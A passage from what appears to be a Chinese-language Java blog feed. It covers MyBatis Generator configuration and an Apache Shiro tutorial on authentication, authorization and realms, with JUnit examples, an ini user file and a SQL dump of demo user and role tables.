class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">db.example.type=mysql</span><br><span class="line">db.example.driver=com.mysql.jdbc.Driver</span><br><span class="line">db.example.url=jdbc:mysql://localhost:3306/bookshop?useUnicode=true&amp;characterEncoding=utf8</span><br><span class="line">db.example.username=username</span><br><span class="line">db.example.password=password</span><br><span class="line"></span><br><span class="line">#MBGInfo</span><br><span class="line">generator.location=D:/apache-maven-3.6.0/repository/mysql/mysql-connector-java/5.1.41/mysql-connector-java-5.1.41.jar</span><br><span class="line">generator.targetPackage=com.kalifun.dao   //需要存放自动生成的目录</span><br><span class="line">gererator.schema=database    //数据库名称</span><br><span class="line">gererator.tableName=book     //需要生成的表名称</span><br><span class="line">gererator.objectName=Book  //自动生成的名称</span><br></pre></td></tr></table></figure></div><h2 id="recourse下创建generatorConfig-xml"><a href="#recourse下创建generatorConfig-xml" class="headerlink" title="recourse下创建generatorConfig.xml"></a>recourse下创建generatorConfig.xml</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE generatorConfiguration</span><br><span class="line">        PUBLIC &quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;</span><br><span class="line">        &quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;generatorConfiguration&gt;</span><br><span class="line">    &lt;!-- 引入配置文件 --&gt;</span><br><span class="line">    &lt;properties resource=&quot;application.properties&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 指定数据库连接驱动jara地址 --&gt;</span><br><span class="line">    &lt;classPathEntry</span><br><span class="line">            location=&quot;$&#123;generator.location&#125;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 一个数据库一个context --&gt;</span><br><span class="line">    &lt;context id=&quot;sqlserverTables&quot;&gt;</span><br><span class="line">        &lt;!-- 生成的pojo，将implements Serializable --&gt;</span><br><span class="line">        &lt;plugin type=&quot;org.mybatis.generator.plugins.SerializablePlugin&quot;&gt;&lt;/plugin&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 注释 --&gt;</span><br><span class="line">        &lt;commentGenerator&gt;</span><br><span class="line">            &lt;property name=&quot;suppressAllComments&quot; value=&quot;true&quot; /&gt;&lt;!-- 是否取消注释 --&gt;</span><br><span class="line">            &lt;!-- &lt;property name=&quot;suppressDate&quot; value=&quot;true&quot; /&gt;  是否生成注释代时间戳 --&gt;</span><br><span class="line">        &lt;/commentGenerator&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 数据库链接URL、用户名、密码 --&gt;</span><br><span class="line">        &lt;jdbcConnection driverClass=&quot;$&#123;db.example.driver&#125;&quot;</span><br><span class="line">                        connectionURL=&quot;$&#123;db.example.url&#125;&quot; userId=&quot;$&#123;db.example.username&#125;&quot;</span><br><span class="line">                        password=&quot;$&#123;db.example.password&#125;&quot;&gt;</span><br><span class="line">        &lt;/jdbcConnection&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 类型转换 --&gt;</span><br><span class="line">        &lt;javaTypeResolver&gt;</span><br><span class="line">            &lt;!-- 默认false，把JDBC DECIMAL 和 NUMERIC 类型解析为 Integer true，把JDBC DECIMAL</span><br><span class="line">                和 NUMERIC 类型解析为java.math.BigDecimal --&gt;</span><br><span class="line">            &lt;property name=&quot;forceBigDecimals&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">        &lt;/javaTypeResolver&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 生成model模型，对应的包路径，以及文件存放路径(targetProject)，targetProject可以指定具体的路径,如./src/main/java，</span><br><span class="line">            也可以使用“MAVEN”来自动生成，这样生成的代码会在target/generatord-source目录下 --&gt;</span><br><span class="line">        &lt;javaModelGenerator targetPackage=&quot;$&#123;generator.targetPackage&#125;&quot;</span><br><span class="line">                            targetProject=&quot;./src/main/java&quot;&gt;</span><br><span class="line">            &lt;!-- 是否在当前路径下新加一层schema,eg：fase路径com.oop.eksp.user.model， true:com.oop.eksp.user.model.[schemaName] --&gt;</span><br><span class="line">            &lt;property name=&quot;enableSubPackages&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">            &lt;!-- 从数据库返回的值被清理前后的空格 --&gt;</span><br><span class="line">            &lt;property name=&quot;trimStrings&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">        &lt;/javaModelGenerator&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--对应的mapper.xml文件 --&gt;</span><br><span class="line">        &lt;sqlMapGenerator targetPackage=&quot;$&#123;generator.targetPackage&#125;&quot;</span><br><span class="line">                         targetProject=&quot;./src/main/java&quot;&gt;</span><br><span class="line">            &lt;property name=&quot;enableSubPackages&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">        &lt;/sqlMapGenerator&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 对应的Mapper接口类文件 --&gt;</span><br><span class="line">        &lt;javaClientGenerator type=&quot;XMLMAPPER&quot;</span><br><span class="line">                             targetPackage=&quot;$&#123;generator.targetPackage&#125;&quot; targetProject=&quot;./src/main/java&quot;&gt;</span><br><span class="line">            &lt;property name=&quot;enableSubPackages&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">        &lt;/javaClientGenerator&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;!-- 列出要生成代码的所有表，这里配置的是不生成Example文件 --&gt;</span><br><span class="line">        &lt;!-- schema即为数据库名 tableName为对应的数据库表 domainObjectName是要生成的实体类 enable*ByExample</span><br><span class="line">                   是否生成 example类   --&gt;</span><br><span class="line">        &lt;table tableName=&quot;$&#123;gererator.tableName&#125;&quot; domainObjectName=&quot;$&#123;gererator.objectName&#125;&quot;</span><br><span class="line">               schema=&quot;$&#123;gererator.schema&#125;&quot;</span><br><span class="line">               enableCountByExample=&quot;false&quot; enableUpdateByExample=&quot;false&quot;</span><br><span class="line">               enableDeleteByExample=&quot;false&quot; enableSelectByExample=&quot;false&quot;</span><br><span class="line">               selectByExampleQueryId=&quot;false&quot;&gt;</span><br><span class="line">            &lt;!-- 忽略列，不生成bean 字段</span><br><span class="line">            &lt;ignoreColumn column=&quot;FRED&quot; /&gt;--&gt;</span><br><span class="line">            &lt;!-- 指定列的java数据类型</span><br><span class="line">            &lt;columnOverride column=&quot;LONG_VARCHAR_FIELD&quot; jdbcType=&quot;VARCHAR&quot; /&gt;  --&gt;</span><br><span class="line">            &lt;!-- 用于指定生成实体类时是否使用实际的列名作为实体类的属性名。false是 Camel Case风格--&gt;</span><br><span class="line">            &lt;property name=&quot;useActualColumnNames&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">    &lt;/context&gt;</span><br><span class="line">&lt;/generatorConfiguration&gt;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiroの基础知识</title>
      <link href="/2019/05/08/shironoji-chu-zhi-shi/"/>
      <url>/2019/05/08/shironoji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiroの基础知识"><a href="#Shiroの基础知识" class="headerlink" title="Shiroの基础知识"></a>Shiroの基础知识</h1><h2 id="Authenticator-用户认证"><a href="#Authenticator-用户认证" class="headerlink" title="Authenticator(用户认证)"></a>Authenticator(用户认证)</h2><blockquote><h3 id="用户认证，用户去访问系统，系统要验证用户身份的合法性"><a href="#用户认证，用户去访问系统，系统要验证用户身份的合法性" class="headerlink" title="用户认证，用户去访问系统，系统要验证用户身份的合法性"></a>用户认证，用户去访问系统，系统要验证用户身份的合法性</h3></blockquote><h2 id="认证方法"><a href="#认证方法" class="headerlink" title="认证方法"></a>认证方法</h2><p> 最常用的用户身份验证的方法：1、用户名密码方式、2、指纹打卡机、3、基于证书验证方法。。系统验证用户身份合法，用户方可访问系统的资源。</p><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><ul><li>创建一个简单的Realm（Realm 充当了 Shiro 与应用安全数据间的“桥梁”或者“连接器”。）</li><li>创建一个SecurityManager </li><li>subject主体发送请求</li><li>用户名密码认证</li><li>Authenticator认证</li><li>Realm验证数据<h2 id="测试Code"><a href="#测试Code" class="headerlink" title="测试Code"></a>测试Code</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package com.imgurl;</span><br><span class="line"></span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.realm.SimpleAccountRealm;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">public class Authrnrization &#123;</span><br><span class="line">//    创建realm</span><br><span class="line">    SimpleAccountRealm simpleAccountRealm = new SimpleAccountRealm();</span><br><span class="line"></span><br><span class="line">    @Before</span><br><span class="line">    public void  add() &#123;</span><br><span class="line">        simpleAccountRealm.addAccount(&quot;admin&quot;,&quot;12345&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void checkauthrization()&#123;</span><br><span class="line">//        1.创建一个管理器</span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(simpleAccountRealm);</span><br><span class="line"></span><br><span class="line">//        2.主体发动请求</span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">//        3.认证</span><br><span class="line">        UsernamePasswordToken token = new UsernamePasswordToken(&quot;admin&quot;,&quot;12345&quot;);</span><br><span class="line">        subject.login(token);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;认证：&quot;+subject.isAuthenticated());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul><h2 id="Authorizer-用户授权"><a href="#Authorizer-用户授权" class="headerlink" title="Authorizer(用户授权)"></a>Authorizer(用户授权)</h2><blockquote><p>用户授权，简单理解为访问控制，在用户认证通过后，系统对用户访问资源进行控制，用户具有资源的访问权限方可访问。</p></blockquote><h2 id="授权流程"><a href="#授权流程" class="headerlink" title="授权流程"></a>授权流程</h2><ul><li>创建一个SecurityManager </li><li>主体授权</li><li>SecurityManager授权</li><li>Authorizer授权</li><li>Realm获取用户角色权限数据<h2 id="测试Code-1"><a href="#测试Code-1" class="headerlink" title="测试Code"></a>测试Code</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package com.imgurl;</span><br><span class="line"></span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.realm.SimpleAccountRealm;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">public class roles &#123;</span><br><span class="line">    SimpleAccountRealm simpleAccountRealm = new SimpleAccountRealm();</span><br><span class="line">    @Before</span><br><span class="line">    public void add() &#123;</span><br><span class="line">        simpleAccountRealm.addAccount(&quot;admin&quot;,&quot;12345&quot;,&quot;Manager&quot;,&quot;Otheruser&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void Authorizer()&#123;</span><br><span class="line">        //    1.创建securityManager</span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(simpleAccountRealm);</span><br><span class="line"></span><br><span class="line">//        2.主体发送请求授权</span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">//        3.authorizer授权</span><br><span class="line">        UsernamePasswordToken token = new UsernamePasswordToken(&quot;admin&quot;,&quot;12345&quot;);</span><br><span class="line">        subject.login(token);</span><br><span class="line">        System.out.println(&quot;认证：&quot;+subject.isAuthenticated());</span><br><span class="line">        subject.checkRoles(&quot;Manager&quot;,&quot;Otheruser&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul><h2 id="Realm"><a href="#Realm" class="headerlink" title="Realm"></a>Realm</h2><blockquote><h3 id="Realm-域，Shiro-从-Realm-中获取用户，角色，权限信息。可以把-Relam-看成-DataSource，即安全数据源。"><a href="#Realm-域，Shiro-从-Realm-中获取用户，角色，权限信息。可以把-Relam-看成-DataSource，即安全数据源。" class="headerlink" title="Realm: 域，Shiro 从 Realm 中获取用户，角色，权限信息。可以把 Relam 看成 DataSource，即安全数据源。"></a>Realm: 域，Shiro 从 Realm 中获取用户，角色，权限信息。可以把 Relam 看成 DataSource，即安全数据源。</h3><p> 前面我们使用的是SimpleAccountRealm，并通过addAccount来预设用户信息。</p></blockquote><h3 id="IniRealm"><a href="#IniRealm" class="headerlink" title="IniRealm"></a>IniRealm</h3><blockquote><p>IniRealm 顾名思义，即通过读取 .ini 文件来获取用户，角色，权限信息。<br> 创建xxx.ini文件(在Test目录下创建resource)</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[users]</span><br><span class="line">admin = 123456,Manager</span><br><span class="line">fun = 123456,Otheruser</span><br><span class="line">用户名 = 密码,角色</span><br><span class="line">[roles]</span><br><span class="line">Manager = user:delete,user:add,user:update,user:select</span><br><span class="line">Otheruser = user:select</span><br><span class="line">角色 = 权限</span><br></pre></td></tr></table></figure></div><h4 id="测试Code-2"><a href="#测试Code-2" class="headerlink" title="测试Code"></a>测试Code</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package com.imgurl;</span><br><span class="line"></span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.AuthenticationException;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.realm.text.IniRealm;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">import java.util.Arrays;</span><br><span class="line"></span><br><span class="line">public class IniRealmTest &#123;</span><br><span class="line">    @Test</span><br><span class="line">    public void IniRealm()&#123;</span><br><span class="line"></span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();</span><br><span class="line">        IniRealm iniRealm = new IniRealm(&quot;classpath:shiro.ini&quot;);</span><br><span class="line">        defaultSecurityManager.setRealm(iniRealm);</span><br><span class="line"></span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken token = new UsernamePasswordToken(&quot;fun&quot;,&quot;123456&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">            System.out.println(&quot;Authenticator:&quot;+subject.isAuthenticated());</span><br><span class="line">            System.out.println(&quot;登陆成功&quot;);</span><br><span class="line">        &#125;catch (AuthenticationException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.out.println(&quot;认证失败&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;--------角色验证---------&quot;);</span><br><span class="line">        System.out.println(&quot;是否具备Manger权限：&quot;+subject.hasRole(&quot;Manager&quot;));</span><br><span class="line">        System.out.println(&quot;是否具备Otheruser权限：&quot;+subject.hasRole(&quot;Otheruser&quot;));</span><br><span class="line">        System.out.println(&quot;是否同事具备Manger和Otheruser权限：&quot;+subject.hasAllRoles(Arrays.asList(&quot;Manager&quot;,&quot;Otheruser&quot;)));</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;---------权限------------&quot;);</span><br><span class="line">        System.out.println(&quot;是否具备user:select权限：&quot;+subject.isPermitted(&quot;user:select&quot;));</span><br><span class="line">        System.out.println(&quot;是否具备user:add权限：&quot;+subject.isPermitted(&quot;user:add&quot;));</span><br><span class="line">        System.out.println(&quot;是否具备user:delete权限：&quot;+subject.isPermitted(&quot;user:delete&quot;));</span><br><span class="line">        System.out.println(&quot;是否具备user:update权限：&quot;+subject.isPermitted(&quot;user:update&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Authenticator:true</span><br><span class="line">登陆成功</span><br><span class="line">--------角色验证---------</span><br><span class="line">是否具备Manger权限：false</span><br><span class="line">是否具备Otheruser权限：true</span><br><span class="line">是否同事具备Manger和Otheruser权限：false</span><br><span class="line">---------权限------------</span><br><span class="line">是否具备user:select权限：true</span><br><span class="line">是否具备user:add权限：false</span><br><span class="line">是否具备user:delete权限：false</span><br><span class="line">是否具备user:update权限：false</span><br></pre></td></tr></table></figure></div><h3 id="JdbcRealm"><a href="#JdbcRealm" class="headerlink" title="JdbcRealm"></a>JdbcRealm</h3><blockquote><p>dbcRelam 顾名思义，即通过通过访问数据库来获取用户，角色，权限信息。</p></blockquote><h4 id="创建数据"><a href="#创建数据" class="headerlink" title="创建数据"></a>创建数据</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">-- --------------------------------------------------------</span><br><span class="line">-- 主机:                           127.0.0.1</span><br><span class="line">-- 服务器版本:                        10.3.10-MariaDB - mariadb.org binary distribution</span><br><span class="line">-- 服务器操作系统:                      Win64</span><br><span class="line">-- HeidiSQL 版本:                  9.4.0.5125</span><br><span class="line">-- --------------------------------------------------------</span><br><span class="line"></span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET NAMES utf8 */;</span><br><span class="line">/*!50503 SET NAMES utf8mb4 */;</span><br><span class="line">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;</span><br><span class="line">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&apos;NO_AUTO_VALUE_ON_ZERO&apos; */;</span><br><span class="line"></span><br><span class="line">-- 导出  表 funimg.roles_permissions 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `roles_permissions` (</span><br><span class="line">  `id` bigint(20) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `role_name` varchar(100) DEFAULT NULL,</span><br><span class="line">  `permission` varchar(100) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `idx_roles_permissions` (`role_name`,`permission`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">-- 正在导出表  funimg.roles_permissions 的数据：~5 rows (大约)</span><br><span class="line">/*!40000 ALTER TABLE `roles_permissions` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `roles_permissions` (`id`, `role_name`, `permission`) VALUES</span><br><span class="line">(6, &apos;Manager&apos;, &apos;user:add&apos;),</span><br><span class="line">(1, &apos;Manager&apos;, &apos;user:delete&apos;),</span><br><span class="line">(2, &apos;Manager&apos;, &apos;user:select&apos;),</span><br><span class="line">(5, &apos;Manager&apos;, &apos;user:update&apos;),</span><br><span class="line">(7, &apos;Otheruser&apos;, &apos;user:select&apos;);</span><br><span class="line">/*!40000 ALTER TABLE `roles_permissions` ENABLE KEYS */;</span><br><span class="line"></span><br><span class="line">-- 导出  表 funimg.users 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `users` (</span><br><span class="line">  `id` bigint(20) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(100) DEFAULT NULL,</span><br><span class="line">  `password` varchar(100) DEFAULT NULL,</span><br><span class="line">  `password_salt` varchar(100) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `idx_users_username` (`username`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">-- 正在导出表  funimg.users 的数据：~2 rows (大约)</span><br><span class="line">/*!40000 ALTER TABLE `users` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `users` (`id`, `username`, `password`, `password_salt`) VALUES</span><br><span class="line">(1, &apos;admin&apos;, &apos;123456&apos;, NULL),</span><br><span class="line">(2, &apos;fun&apos;, &apos;123456&apos;, NULL);</span><br><span class="line">/*!40000 ALTER TABLE `users` ENABLE KEYS */;</span><br><span class="line"></span><br><span class="line">-- 导出  表 funimg.user_roles 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `user_roles` (</span><br><span class="line">  `id` bigint(20) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(100) DEFAULT NULL,</span><br><span class="line">  `role_name` varchar(100) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `idx_user_roles` (`username`,`role_name`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">-- 正在导出表  funimg.user_roles 的数据：~2 rows (大约)</span><br><span class="line">/*!40000 ALTER TABLE `user_roles` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `user_roles` (`id`, `username`, `role_name`) VALUES</span><br><span class="line">(1, &apos;admin&apos;, &apos;Manager&apos;),</span><br><span class="line">(2, &apos;fun&apos;, &apos;Otheruser&apos;);</span><br><span class="line">/*!40000 ALTER TABLE `user_roles` ENABLE KEYS 